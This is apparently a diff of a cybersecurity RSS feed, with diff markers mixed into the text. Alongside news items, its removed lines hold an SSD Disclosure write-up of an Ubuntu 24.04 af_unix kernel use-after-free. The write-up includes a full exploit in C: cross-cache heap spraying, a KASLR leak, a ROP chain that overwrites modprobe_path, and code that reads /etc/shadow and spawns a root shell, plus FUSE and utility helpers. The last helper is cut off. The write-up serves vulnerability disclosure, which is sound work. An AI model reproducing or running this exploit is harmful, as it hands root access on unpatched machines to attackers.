 In]]></content:encoded></item><item><title>Ex-L3Harris exec guilty of selling cyber exploits to Russian broker</title><link>https://www.bleepingcomputer.com/news/security/ex-l3harris-exec-guilty-of-selling-cyber-exploits-to-russian-broker/</link><author>Bill Toulas</author><category>security</category><pubDate>Thu, 30 Oct 2025 16:43:51 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Peter Williams, a former general manager at U.S. defense contractor L3Harris Trenchant, has pleaded guilty in U.S. District Court to stealing and selling confidential cybersecurity information to a Russian vulnerability exploit broker. [...]]]></content:encoded></item><item><title>Russian Ransomware Gangs Weaponize Open-Source AdaptixC2 for Advanced Attacks</title><link>https://thehackernews.com/2025/10/russian-ransomware-gangs-weaponize-open.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhHAemb8q0dPL4UJx7V6h0octnu9dSgvaV0KNS8ctKdDRlcrt51uM9BXud3jaJ7Gkc-NGMJfTfTmShpq9ehcNjW2nh-ncTHD37MRt9iY7ThMZKxp_ULdweMDi6iI0O8m_LkZV0N8Yegr1VWMxRUviU5h8jb3z0wlcxzru3Zu48O0AojPbgLvxLOQ8pEDBlS/s1600/post-install.jpg" length="" type=""/><pubDate>Thu, 30 Oct 2025 16:40:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[The open-source command-and-control (C2) framework known as AdaptixC2 is being used by a growing number of threat actors, some of whom are related to Russian ransomware gangs.
 AdaptixC2 is an emerging extensible post-exploitation and adversarial emulation framework designed for penetration testing. While the server component is written in Golang, the GUI Client is written in C++ QT for]]></content:encoded></item><item><title>RediShell RCE Vulnerability Exposes 8,500+ Redis Instances to Code Execution Attacks</title><link>https://cybersecuritynews.com/redishell-rce-vulnerability-exposes-8500-redis/</link><author></author><category>security</category><pubDate>Thu, 30 Oct 2025 16:35:56 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
@@ -2445,967 +2505,7 @@ If you are a website developer or IT professional, and you have users who may be
 
 While we believe that warning on insecure public sites represents a significant step forward for the security of the web, there is still more work to be done. In the future, we hope to work to further reduce barriers to adoption of HTTPS, especially for local network sites. This work will hopefully enable even more robust HTTP protections down the road.
 ]]></content:encoded></item><item><title>Why Early Threat Detection Is a Must for Long-Term Business Growth</title><link>https://thehackernews.com/2025/10/why-early-threat-detection-is-must-for.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjahIAFVAlDP3Fg0ZEiWhBxiZNiuovhyYDTY1yaKWFxZ3inBHxDKuycmzTZMk_vJvOKVrIYlsh6_rR_-kK1VY2bR5V-E7Nw5QWvXm3UTFCUdUJyPyBo6hS5XUE4fpoPYtSzxnMRoyxINGnZeP_qWmO_QxdG4jin0uGtzYcG0qgg2Guqv8x4x7q8yuVlWLQ/s1600/anyrun-main.jpg" length="" type=""/><pubDate>Tue, 28 Oct 2025 11:55:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[In cybersecurity, speed isn’t just a win — it’s a multiplier. The faster you learn about emerging threats, the faster you adapt your defenses, the less damage you suffer, and the more confidently your business keeps scaling. Early threat detection isn’t about preventing a breach someday: it’s about protecting the revenue you’re supposed to earn every day.
-Companies that treat cybersecurity as a]]></content:encoded></item><item><title>New Ubuntu Kernel LPE!</title><link>https://ssd-disclosure.com/lpe-via-refcount-imbalance-in-the-af_unix-of-ubuntus-kernel/</link><author>/u/SSDisclosure</author><category>netsec</category><pubDate>Tue, 28 Oct 2025 11:44:40 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Ubuntu 24.04.2 with the kernel 6.8.0-60-genericThe vendor has released an updated kernel on the 18th of SeptemberThe vulnerability was disclosed during our TyphoonPWN 2025 Linux category and won first place.The vulnerability is caused by a refcount imbalance issue in the af_unix subsystem of Ubuntu’s kernel.The af_unix subsystem allows users to send fds across processes.To address issues caused by circular references in the situation where the fd we send is the socket itself, this subsystem comes up with a garbage collection mechanism.The specific algorithm used in the garbage collection is not relevant for this bug, so I’m not going to talk about it here, interested readers can refer to this projectzero blog (https://googleprojectzero.blogspot.com/2022/08/the-quantum-state-of-linux-kernel.html).Recently, through a series of patches, Linux replaced its garbage collection algorith (https://github.com/gregkh/linux/commit/4090fa373f0e763c43610853d2774b5979915959).On top of the new gc, a new change is introduced to af_unix (https://github.com/gregkh/linux/commit/f0f170d7b7ed9b824e8f2502dfba4ee1eb76dac4), which is to make  do no hold a skb reference. is a out of band skb that can be created by  with the  flag. It used to hold a reference to the skb but this refcounting led to a lot of bugs in the past.Therefore this patch is to make sure  no longer holds a refcount, making it just a pointer.Notice that this change involves changing two files:  and , the most relevant changes are as follows:(1) make sure the  function in  does not give  a refcount (delete )(2) make sure the  function in  does not decrease the refcount (delete )Ubuntu 24.04’s kernel, which is based on (on 6.8.12), uses the old GC algorithm. Thus, the change to  does not apply (the upstream patch is for the new GC algorithm).But somehow Ubuntu still went with it and applied the change to , which is to remove the  line.The old GC algorithm also decrease ‘s reference in , just use a different function call ().As a result, Ubuntu’s incorrect change to  caused a refcount inbalance, leading to UAF of a  object, which in a dedicated cache (“skbuff_head_cache”) and each object is of size 0x100.The relevant code is listed as follows:static int queue_oob(struct socket *sock, struct msghdr *msg, struct sock *other,
-             struct scm_cookie *scm, bool fds_sent)
-{
-    ...
-    skb = sock_alloc_send_skb(sock->sk, 1, msg->msg_flags & MSG_DONTWAIT, &err);
-    ...
-    skb_put(skb, 1);
-    skb_get(skb); <--- this is what Ubuntu removes
-    ...
-    WRITE_ONCE(ousk->oob_skb, skb);
-    ...
-}
-
-void unix_gc(void)
-{
-    ...
-    list_for_each_entry(u, &gc_candidates, link) {
-        ...
-        if (u->oob_skb) {
-            kfree_skb(u->oob_skb);
-            u->oob_skb = NULL;
-        }
-    }
-    ...
-}
-
-static void unix_release_sock(struct sock *sk, int embrion)
-{
-    ...
-    while ((skb = skb_dequeue(&sk->sk_receive_queue)) != NULL) {
-        ...
-        kfree_skb(skb);
-    }
-    ...
-}As we can see in the code above, previously, the  has two references.When we close the sockets, one refcount will be decreased by the  and the other gets decreased by  which is the handler of .Now that Ubuntu removes the  line in , in theory, we can trigger UAF in either  or .But in practice, the object is always freed by  and the UAF use always happens in .Notice that both  and  can happen after we close the af_unix socket.We need a way to separate the invocation of these two functions so that we can do our exploitation, which usually takes some time.My approach is to force GC right after closing the af_unix socket by sending another af_unix packet.static int unix_dgram_sendmsg(...)
-{
-    ...
-    wait_for_unix_gc();
-    ...
-    err = skb_copy_datagram_from_iter(skb, 0, &msg->msg_iter, len);
-    ...
-}
-
-#define UNIX_INFLIGHT_TRIGGER_GC 16000
-void wait_for_unix_gc(void)
-{
-    if (READ_ONCE(unix_tot_inflight) > UNIX_INFLIGHT_TRIGGER_GC && !READ_ONCE(gc_in_progress))
-        unix_gc();
-    ...
-}As we can see above, if we have a huge , we can trigger  when doing sendmsg. means the total number of af_unix sockets that are being sent by af_unix sockets, which can be easily done by users of any privilege level.As a result, we can deterministically invoke . is a callback function for , whose invocation cannot be controlled through syscalls.But interestingly, it is marked as a TWA_RESUME work, which is a work to do right after finishing a syscall and right before returning back to userspace (see ).In our case, after , the last reference to the socket will be gone, so  will be scheduled right after the triggering  syscall.In other words, we need to perform all the heap-related stuff within the  syscall, which is almost impossible.But luckily, there is a skb_copy_datagram_from_iter function after  and before the invocation of . This function invokes  internally, which gives us a chance to halt the execution of the syscall.There are a few ways to achieve this. I chose the easiest approach, which is to use FUSE.Specifically, we can  an address that is backed by a FUSE filesystem and pass this address to skb_copy_datagram_from_iter.When the  hits, it will realize that although this address is mapped, the content is not there yet.So it will invoke our  handler to retrieve the data.We make  sleep for a few seconds, delaying the execution.As a result, we can deterministically trigger  to free the object, halt the syscall through FUSE, and then finally invoke  to use the freed object when the syscall finishes.Since our vulnerable object is in a dedicated cache (“skbuff_head_cache”), we will have to resolve to the cross-cache attack.Essentially, we free all objects in the cache so that the page used by the slab is returned back to the page allocator.Then we can reclaim the page with data we control.Here, I chose to reclaim the page with  because it is the easiest to implement and we control the number of pages.As a result, we are able to overwrite the vulnerable object with data we control.Now let’s see what we can do with the overwrite.Essentially, the kernel will invoke  (through ) where the content of `skb is in our control.Digging into it, we can see this codevoid skb_release_head_state(struct sk_buff *skb)
-{
-    ...
-    if (skb->destructor) {
-        DEBUG_NET_WARN_ON_ONCE(in_hardirq());
-        skb->destructor(skb);
-    }
-    ...
-}So, we will have RIP control and rdi pointing to what we control.But, we need KASLR leak.We can easily bypas KASLR using prefetch attack these days.Entrybleed is the most famous prefetch attack variant.But since modern computers no longer has KPTI on anymore, we can directly prefetch the kernel space and probe where the kernel is.With statistical analysis and a major vote algorithm, my exploit can bypass KALSR with 100% successs rate.Finally, with KASLR bypassed and RIP/rdi control, we can easily ROP to overwrite modprobe_path and escalate to root.Since 2007,  has been helping security researchers turn their findings into thriving careers.Explore our  – updated monthly with new products and vendors.// poc.c
-#define _GNU_SOURCE
-
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <unistd.h>
-#include <stdint.h>
-#include <stdarg.h>
-#include <pthread.h>
-#include <assert.h>
-#include <fcntl.h>
-#include <signal.h>
-#include <sched.h>
-#include <arpa/inet.h>
-#include <sys/syscall.h>
-#include <sys/ioctl.h>
-#include <sys/socket.h>
-#include <sys/prctl.h>
-#include <sys/mman.h>
-#include <linux/if_ether.h>
-#include <linux/if_packet.h>
-#include <net/if.h>
-#include <linux/sockios.h>
-#include <sys/resource.h>
-
-typedef unsigned long long u64;
-typedef unsigned int u32;
-
-extern u64 cpu_num;
-void set_cpu(int cpuid);
-int pg_vec_spray(void *src_buf, u32 buf_size, u32 num);
-void setup_pg_vec();
-pid_t clean_fork(void);
-u64 entrybleed_get_kaslr_slide_nopti();
-
-#define SPRAY_NUM_1 0x200
-#define SPRAY_NUM_2 0x40
-#define SPRAY_NUM_3 0x40
-#define FORK_NUM 10
-#define ARRAY_LEN(x) (sizeof(x) / sizeof(x[0]))
-int spray_sock1[SPRAY_NUM_1/0x10];
-int spray_sock2[SPRAY_NUM_2/0x10];
-int spray_sock3[SPRAY_NUM_3/0x10];
-char payload[0x2000];
-u64 pg_vec_spray_size = 0x2000;
-u64 kaslr_slide = 0;
-
-char path[0x800];
-
-int socks[2];
-int socks2[2];
-int pid = -1;
-void *fuse_addr;
-
-int *stage;
-int *status_ptr;
-
-void wait_for_all_status(int status);
-
-void payload_setup()
-{
-	int fd = open("/tmp/exp/lol", O_RDWR);
-	assert(fd >= 0);
-	fuse_addr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
-	assert((long long)fuse_addr >= 0);
-
-	memset(payload, 'B', sizeof(payload));
-	for(int i=0; i<pg_vec_spray_size/0x100; i++) {
-		void *obj = (void *)(payload + i*0x100);
-		*(int *)(obj + 0x9e + 4) = 1;
-		*(int *)(obj + 0x9e - 4) = 1;
-		*(u64*)(obj + 0x9e - 4 - 0x7c - 8) = 0;
-		*(u64*)(obj + 0x9e - 4 - 0x7c) = kaslr_slide + 0xffffffff8196a4d5; // : mov rax, qword ptr [rbx + 0x18] ; mov rsi, rbx ; call rax
-
-		// unlink
-		*(u64*)(obj + 0xbe) = kaslr_slide + 0xffffffff8438c000;
-		*(u64*)(obj + 0xbe +8) = kaslr_slide + 0xffffffff8438c000;
-
-		// pivot
-		void *ptr = obj + 0xbe;
-		*(u64*)(ptr + 0x18) = kaslr_slide + 0xffffffff81b146da; // : push rdi ; jmp qword ptr [rsi + 0x39]
-		*(u64*)(ptr + 0x39) = kaslr_slide + 0xffffffff8223e7da; // : pop rsp; pop rbx; pop rbp; ret;
-
-		// ROP chain
-		*(u64*)(ptr + 0x10) = kaslr_slide + 0xffffffff81852574; //: add rsp, 0x48; pop rbp; ret
-		*(u64*)(ptr + 0x68) = kaslr_slide + 0xffffffff810f1ce0; //: pop rsi; pop rdi; pop rbx; ret
-		*(u64*)(ptr + 0x70) = kaslr_slide + 0xffffffff837de280-0x10; // modprobe_path
-		*(u64*)(ptr + 0x78) = 0x782f706d742f; // /tmp/x
-		*(u64*)(ptr + 0x80) = 0;
-		*(u64*)(ptr + 0x88) = kaslr_slide + 0xffffffff81cdf1d9; // : mov qword ptr [rsi + 0x10], rdi ; xor esi, esi ; xor edi, edi ; ret
-		*(u64*)(ptr + 0x90) = kaslr_slide + 0xffffffff82252e95; //: pop rdi; ret;
-		*(u64*)(ptr + 0x98) = 0x7fffffff;
-		*(u64*)(ptr + 0xa0) = kaslr_slide + 0xffffffff81209f20; // msleep
-	}
-}
-
-void trigger_gc()
-{
-	send(socks2[0], fuse_addr, 1, 0);
-}
-
-void skb_spray_1()
-{
-	char buf[0x40];
-	memset(buf, 'A', sizeof(buf));
-	int i = 0;
-	int num = SPRAY_NUM_1;
-	int socks[2];
-
-	while(num) {
-		int ret = socketpair(AF_UNIX, SOCK_DGRAM, 0, socks);
-		assert(ret == 0);
-
-		int todo = 0x10;
-		if (num < 0x10) todo = num;
-		for(int i=0; i<todo; i++) {
-			send(socks[0], buf, sizeof(buf), 0);
-		}
-		num -= todo;
-		spray_sock1[i++] = socks[1];
-	}
-}
-
-void skb_spray_2()
-{
-	char buf[0x40];
-	memset(buf, 'A', sizeof(buf));
-	int i = 0;
-	int num = SPRAY_NUM_2;
-	int socks[2];
-
-	while(num) {
-		int ret = socketpair(AF_UNIX, SOCK_DGRAM, 0, socks);
-		assert(ret == 0);
-
-		int todo = 0x10;
-		if (num < 0x10) todo = num;
-		for(int i=0; i<todo; i++) {
-			send(socks[0], buf, sizeof(buf), 0);
-		}
-		num -= todo;
-		spray_sock2[i++] = socks[1];
-	}
-}
-
-void skb_spray_3()
-{
-	char buf[0x40];
-	memset(buf, 'A', sizeof(buf));
-	int i = 0;
-	int num = SPRAY_NUM_3;
-	int socks[2];
-
-	while(num) {
-		int ret = socketpair(AF_UNIX, SOCK_DGRAM, 0, socks);
-		assert(ret == 0);
-
-		int todo = 0x10;
-		if (num < 0x10) todo = num;
-		for(int i=0; i<todo; i++) {
-			send(socks[0], buf, sizeof(buf), 0);
-		}
-		num -= todo;
-		spray_sock3[i++] = socks[1];
-	}
-}
-
-void skb_release_1()
-{
-	char buf[0x100];
-	for(int i=0; i<SPRAY_NUM_1/0x10; i++) {
-		recv(spray_sock1[i], buf, 0x100, 0);
-	}
-}
-
-void skb_release_2()
-{
-	char buf[0x100];
-	for(int i=0; i<SPRAY_NUM_2/0x10; i++) {
-		for(int j=0; j<0x10; j++)
-			recv(spray_sock2[i], buf, 0x100, 0);
-	}
-}
-
-void skb_release_3()
-{
-	char buf[0x100];
-	for(int i=0; i<SPRAY_NUM_3/0x10; i++) {
-		for(int j=0; j<0x10; j++)
-			recv(spray_sock3[i], buf, 0x100, 0);
-	}
-}
-
-int val = 0;
-int *ptr = &val;
-void *gc_func(void *arg)
-{
-	set_cpu(1);
-
-	close(socks[1]);
-	close(socks[0]);
-
-	*ptr = 1;
-	trigger_gc();
-	sleep(10000);
-}
-
-void exploit(void)
-{
-	mmap((void*)0x20000000, 0x1000, PROT_WRITE|PROT_READ|PROT_EXEC, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
-
-	int ret = socketpair(AF_UNIX, SOCK_STREAM, 0, socks);
-	assert(ret == 0);
-
-	ret = socketpair(AF_UNIX, SOCK_DGRAM, 0, socks2);
-	assert(ret == 0);
-
-	char ubuf[] = "AA";
-	struct iovec vec = {
-		.iov_base = ubuf,
-		.iov_len = 2,
-	};
-
-	struct msghdr msghdr = {
-		.msg_name = NULL,
-		.msg_namelen = 0,
-		.msg_iov = &vec,
-		.msg_iovlen = 1,
-		.msg_control = (void*)0x20000340,
-		.msg_controllen = 0x38,
-		.msg_flags = 0,
-	};
-
-	*(uint64_t*)0x20000340 = 0x1c;
-	*(uint32_t*)0x20000348 = SOL_SOCKET;
-	*(uint32_t*)0x2000034c = SCM_CREDENTIALS;
-	*(uint32_t*)0x20000350 = getpid();
-	*(uint32_t*)0x20000354 = 0;
-	*(uint32_t*)0x20000358 = 0;
-
-	*(uint64_t*)0x20000360 = 0x14;
-	*(uint32_t*)0x20000368 = SOL_SOCKET;
-	*(uint32_t*)0x2000036c = SCM_RIGHTS;
-	*(uint32_t*)0x20000370 = socks[0];
-
-	skb_spray_1();
-
-	// make sure the victim skb is in a controlled page
-	skb_spray_2();
-	sendmsg(socks[1], &msghdr, MSG_OOB);
-	skb_spray_3();
-
-	// force the target slab to be in cpu_partial
-	skb_release_2();
-	skb_release_3();
-
-	// flush cpu_partial
-	skb_release_1();
-	sleep(1);
-
-	// trigger the free in another thread and delay the trigger using FUSE
-	pthread_t tid = 0;
-	ret = pthread_create(&tid, NULL, gc_func, NULL);
-	assert(ret == 0 );
-	while(*ptr != 1);
-
-	// now spray pages using multiple processes
-	*stage = 1;
-	pg_vec_spray(payload, pg_vec_spray_size, 0x200);
-	wait_for_all_status(1);
-
-	// now sleep forever and wait for the payload to get triggered
-	puts("[*] wait for the payload to get triggered");
-	while(1);sleep(1000000);
-}
-
-void increase_inflight(int num)
-{
-	int socks[2];
-	int socks2[2];
-	int ret = socketpair(AF_UNIX, SOCK_DGRAM, 0, socks);
-	assert(ret == 0);
-
-	ret = socketpair(AF_UNIX, SOCK_DGRAM, 0, socks2);
-	assert(ret == 0);
-
-	char ubuf[] = "A";
-	struct iovec vec = {
-		.iov_base = ubuf,
-		.iov_len = 1,
-	};
-
-	int buf_size = CMSG_ALIGN(0x10+num*sizeof(int));
-	void *buf = malloc(buf_size);
-	memset(buf, 0, buf_size);
-
-	struct msghdr msghdr = {
-		.msg_name = NULL,
-		.msg_namelen = 0,
-		.msg_iov = &vec,
-		.msg_iovlen = 1,
-		.msg_control = buf,
-		.msg_controllen = buf_size,
-		.msg_flags = 0,
-	};
-
-	struct cmsghdr *cmsghdr = (struct cmsghdr *)buf;
-	cmsghdr->cmsg_len = 0x10+num*sizeof(int);
-	cmsghdr->cmsg_level = SOL_SOCKET;
-	cmsghdr->cmsg_type = SCM_RIGHTS;
-	int *fd_array = (int *)(buf + sizeof(struct cmsghdr));
-	for(int i=0; i<num; i++) {
-		fd_array[i] = socks2[0];
-	}
-
-	ret = sendmsg(socks[1], &msghdr, 0);
-	assert(ret >= 0);
-}
-
-void prepare_force_gc()
-{
-	for(int i=0; i<16; i++) {
-		if(!clean_fork()) {
-			for(int j=0; j<5; j++) {
-				increase_inflight(200);
-			}
-			sleep(100000);
-		}
-	}
-	sleep(1);
-}
-
-void spray_func(int idx)
-{
-	while(*stage == 0);
-	pg_vec_spray(payload, pg_vec_spray_size, 0x200);
-	status_ptr[idx] = 1;
-
-	sleep(10000);
-	// while(1);
-}
-
-void setup_context(void)
-{
-	// depending on the number of CPU, our target slab will have different number of pages
-	if (cpu_num > 4) {
-		pg_vec_spray_size = 0x2000;
-	} else {
-		pg_vec_spray_size = 0x1000;
-	}
-	printf("[*] pg_vec_spray_size: %#llx\n", pg_vec_spray_size);
-
-	stage = (int *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANON, -1, 0);
-	assert((long)stage != -1);
-	*stage = 0;
-	status_ptr = stage + 1;
-
-	for(int i=0; i<FORK_NUM; i++) {
-		if(!clean_fork()){
-			spray_func(i);
-			exit(0);
-		}
-	}
-}
-
-void wait_for_all_status(int status)
-{
-	int done = 0;
-	while(1) {
-		for(int i=0; i<FORK_NUM; i++) {
-			if(status_ptr[i] != status) continue;
-			if(i == FORK_NUM-1) return;
-		}
-	}
-}
-
-void increase_limit()
-{
-    int ret;
-    struct rlimit open_file_limit;
-
-    /* Query current soft/hard value */
-    ret = getrlimit(RLIMIT_NOFILE, &open_file_limit);
-    assert(ret >= 0);
-
-    /* Set soft limit to hard limit */
-    open_file_limit.rlim_cur = open_file_limit.rlim_max;
-    ret = setrlimit(RLIMIT_NOFILE, &open_file_limit);
-    assert(ret >= 0);
-}
-
-void attempt()
-{
-	char *buf = getenv("SLIDE");
-	kaslr_slide = (u64)atoll(buf);
-	printf("[*] exploit attempt with kaslr_slide: %#llx\n", kaslr_slide);
-	increase_limit();
-	setup_pg_vec();
-	payload_setup();
-	setup_context();
-
-	exploit();
-}
-
-int modprobe_overwritten() {
-	int fd = open("/proc/sys/kernel/modprobe", 0);
-	char buf[0x2000];
-	memset(buf, 0, sizeof(buf));
-	read(fd, buf, sizeof(buf));
-	return !strncmp(buf, "/tmp/x", 6);
-}
-
-void check_root() {
-	// if we are root
-	if (open("/etc/shadow", 0) >= 0) {
-		setuid(0);
-		setgid(0);
-		puts("============================");
-		puts("|   Pwned by @ky1ebot !    |");
-		puts("============================");
-		system("id;");
-		puts("============================");
-		system("head -n 10 /etc/shadow");
-		puts("============================");
-		system("/bin/bash");
-		exit(0);
-	}
-	// or if we can be root
-	int tmp_fd = open("/proc/sys/kernel/modprobe", 0);
-	char buf[0x2000];
-	memset(buf, 0, sizeof(buf));
-	read(tmp_fd, buf, sizeof(buf));
-	if (!strncmp(buf, "/tmp/x", 6)) {
-		sprintf(buf, "echo '#!/bin/bash\\nchown root:root %s; chmod 04755 %s' > /tmp/x; chmod +x /tmp/x", path, path);
-		system(buf);
-		system("echo 1 > /tmp/1; chmod +x /tmp/1; /tmp/1 2> /dev/null");
-		char * argv[] = {
-			path,
-			NULL
-		};
-		char * env[] = {
-			NULL
-		};
-		execve(path, argv, env);
-	}
-}
-
-int main(int argc, char ** argv, char ** env)
-{
-	// save absolute path for later use
-	if (argc && argv[0] && argv[0][0]) assert(realpath(argv[0], path) != NULL);
-
-	// in case we already are/can be root
-	check_root();
-
-	// if this is an exploit process
-	if (getenv("SLIDE")) {
-		puts("[*] attempt!");
-		attempt();
-		exit(0);
-	}
-
-	// launch fuse
-	system("mkdir -p /tmp/exp && ./fusefs /tmp/exp");
-
-	// prepare
-	increase_limit();
-	prepare_force_gc();
-
-	// launch exploit process
-	char *cmd = NULL;
-	int ret = asprintf(&cmd, "busybox sh -c 'unshare -rn %s'", path);
-	assert(ret >= 0);
-	puts(cmd);
-	while(1) {
-		// leak kaslr
-		kaslr_slide = entrybleed_get_kaslr_slide_nopti();
-		if (kaslr_slide == -1) {
-			puts("[-] fail to leak kaslr_slide");
-			continue;
-		}
-		printf("[+] kaslr_slide: %#llx\n", kaslr_slide);
-
-		// pass it to the exploit process
-		char *buf = NULL;
-		ret = asprintf(&buf, "%lld", kaslr_slide);
-		assert(ret >= 0);
-		setenv("SLIDE", buf, 1);
-
-		if(!clean_fork()) {
-			system(cmd);
-			sleep(10000);
-		}
-
-		// give each exploit 6 seconds to run
-		int good = 0;
-		for(int i=0; i<6; i++) {
-			if (modprobe_overwritten()) {
-				good = 1;
-				break;
-			}
-			sleep(1);
-		}
-
-		// check whether we succeed or not
-		if (good) {
-			puts("[+] successfully overwrite modprobe_path");
-			break;
-		} else {
-			puts("[-] failed to overwrite modprobe_path");
-		}
-	}
-
-	check_root();
-	while(1) sleep(100000);
-	return 0;
-}// FUSE: Filesystem in USErspace
-// fusefs.c - FUSE filesystem handler
-// Made by @LukeGix
-
-#define FUSE_USE_VERSION 26
-
-#include <fuse.h>
-#include <stdio.h>
-#include <string.h>
-#include <errno.h>
-#include <fcntl.h>
-#include <unistd.h>
-#include <err.h>
-#include <sys/uio.h>
-#include <assert.h>
-#include <stdlib.h>
-
-#define FILE_TARGET "/lol"
-
-unsigned int file_size = 0x10;
-
-char file_buffer[4096];
-int len = 10;
-static int FUSE_getattr(const char *path, struct stat *stbuf){
-	int res = 0;
-	memset(stbuf, 0, sizeof(struct stat));
-	if (strcmp(path, "/") == 0) {
-		stbuf->st_mode = S_IFDIR | 0755;
-		stbuf->st_nlink = 2;
-	} else if (strcmp(path, FILE_TARGET) == 0) {
-		stbuf->st_mode = S_IFREG | 0666;
-		stbuf->st_nlink = 1;
-		stbuf->st_size = file_size;
-		stbuf->st_blocks = 0;
-	}
-	else {
-		res = -ENOENT;
-	}
-	return res;
-}
-
-// It defines the result of, for example, `ls`
-static int FUSE_readdir(const char *path, void *buf, fuse_fill_dir_t filler, off_t offset, struct fuse_file_info *fi) {
-	filler(buf, ".", NULL, 0);
-	filler(buf, "..", NULL, 0);
-	filler(buf, "lol", NULL, 0);
-	return 0;
-}
-
-static int FUSE_open(const char *path, struct fuse_file_info *fi) {
-	return 0;
-}
-
-static int FUSE_read(const char *path, char *buf, size_t size, off_t offset, struct fuse_file_info *fi){
-	if(strcmp(path, FILE_TARGET) == 0){
-		//for(;;){
-		//	printf("[+] Pausing kernel thread...\n");
-		//	sleep(200);
-		//}
-		printf("[+] Pausing kernel thread for 5s\n");
-		sleep(2);
-		memcpy(buf, file_buffer, size);
-	}
-
-	return size;
-}
-
-
-static int FUSE_write(const char *path, const char *buf_to_write, size_t size, off_t offset, struct fuse_file_info *fi ){
-	if(strcmp(path, FILE_TARGET) == 0){
-		assert(offset <= 4096 && (file_size + size) <= 4096);
-		//Write in no-append mode
-		if(offset == 0){
-			memset(file_buffer, 0,4096);
-			file_size = 0;
-		}
-		memcpy(file_buffer+offset, buf_to_write, size);
-		file_size += size;
-	}
-	return size;
-}
-
-// Just random stubs
-static int FUSE_setxattr(const char *a, const char *b, const char *c, size_t d, int e){
-	return 0;
-}
-
-static int FUSE_truncate(const char *a, off_t b, struct fuse_file_info *fi){
-		return 0;
-}
-
-static int FUSE_chmod(const char *, mode_t, struct fuse_file_info *fi){
-		return 0;
-}
-
-static int FUSE_chown(const char *, uid_t, gid_t, struct fuse_file_info *fi){
-		return 0;
-}
-
-static int FUSE_utimens(const char *, const struct timespec tv[2], struct fuse_file_info *fi){
-		return 0;
-}
-
-
-static struct fuse_operations FUSE_ops = {
-	.getattr	= FUSE_getattr,
-	.readdir	= FUSE_readdir,
-	.open	   = FUSE_open,
-	.read	   = FUSE_read,
-	.write 	= FUSE_write,
-	.setxattr 	= FUSE_setxattr,
-	.truncate 	= FUSE_truncate,
-	.chmod 	= FUSE_chmod,
-	.chown 	= FUSE_chown,
-	.utimens 	= FUSE_utimens
-};
-
-int main(int argc, char *argv[]) {
-	//Initialization of the filesystem
-	memset(file_buffer, 'A', sizeof(file_buffer));
-	return fuse_main(argc, argv, &FUSE_ops, NULL);
-}// util.c
-#define _GNU_SOURCE
-
-#include <stdio.h>
-#include <stdlib.h>
-#include <stdarg.h>
-#include <signal.h>
-#include <sched.h>
-#include <time.h>
-#include <math.h>
-#include <string.h>
-#include <sys/mman.h>
-#include <arpa/inet.h>
-#include <net/if.h>
-#include <linux/if_ether.h>
-#include <linux/if_packet.h>
-#include <linux/sockios.h>
-#include <sys/prctl.h>
-#include <sys/ioctl.h>
-
-typedef unsigned int u32;
-typedef unsigned long long u64;
-
-u64 cpu_num;
-
-void error_out(const char *fmt, ...)
-{
-    char *buf;
-    va_list ap;
-
-    va_start(ap, fmt);
-    if(vasprintf(&buf, fmt, ap) < 0) {
-        perror("[error_out]");
-        exit(-1);
-    }
-    va_end(ap);
-    
-    puts(buf);
-    perror("[Reason] ");
-    exit(-1);
-}
-
-pid_t clean_fork(void)
-{
-    pid_t pid = fork();
-    if(pid) return pid; 
-
-    if(prctl(PR_SET_PDEATHSIG, SIGKILL) < 0) error_out("fail to register DEATHSIG");
-    return pid; 
-}
-
-void set_cpu(int cpuid)
-{
-    cpu_set_t my_set;
-    CPU_ZERO(&my_set);
-    CPU_SET(cpuid, &my_set);
-    if(sched_setaffinity(0, sizeof(my_set), &my_set) != 0)
-        error_out("set cpu affinity at cpu: %d fails", cpuid);
-}
-
-int pg_vec_spray(void *src_buf, u32 buf_size, u32 num)
-{
-    if((buf_size & 0xfff) != 0) error_out("[pg_vec_spray] buf_size");
-
-    // remember to run everything in sandbox
-    int s = socket(AF_PACKET, SOCK_RAW|SOCK_CLOEXEC, htons(ETH_P_ALL));
-    if(s < 0) error_out("[pg_vec_spray] socket");
-
-    struct tpacket_req req;
-    req.tp_block_size = buf_size;
-    req.tp_block_nr = num;// spray times
-    req.tp_frame_size = buf_size;
-    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;
-    int ret = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
-    if(ret < 0) error_out("[pg_vec_spray] setsockopt");
-
-    struct sockaddr_ll sa;
-    memset(&sa, 0, sizeof(sa));
-    sa.sll_family = PF_PACKET;
-    sa.sll_protocol = htons(ETH_P_ARP);
-    sa.sll_ifindex = if_nametoindex("lo");
-    sa.sll_hatype = 0;
-    sa.sll_pkttype = 0;
-    sa.sll_halen = 0;
-
-    memset(&sa, 0, sizeof(sa));
-    sa.sll_ifindex = if_nametoindex("lo");
-    sa.sll_halen = ETH_ALEN;
-    void *addr = mmap(NULL, buf_size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON|MAP_POPULATE, -1, 0);
-    memcpy(addr, src_buf, buf_size);
-    for(int i=0; i<num; i++) {
-        ret = sendto(s, addr, buf_size, 0, (struct sockaddr *)&sa, sizeof(sa));
-        if(ret < 0) error_out("[pg_vec_spray] sendto");
-    }
-    return s;
-}
-
-void setup_pg_vec()
-{
-    // bring up lo interface
-    int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
-    struct ifreq req;
-    memset(&req, 0, sizeof(req));
-    strcpy(req.ifr_name, "lo");
-    req.ifr_flags = IFF_UP|IFF_LOOPBACK|IFF_RUNNING;
-    int ret = ioctl(fd, SIOCSIFFLAGS, &req);
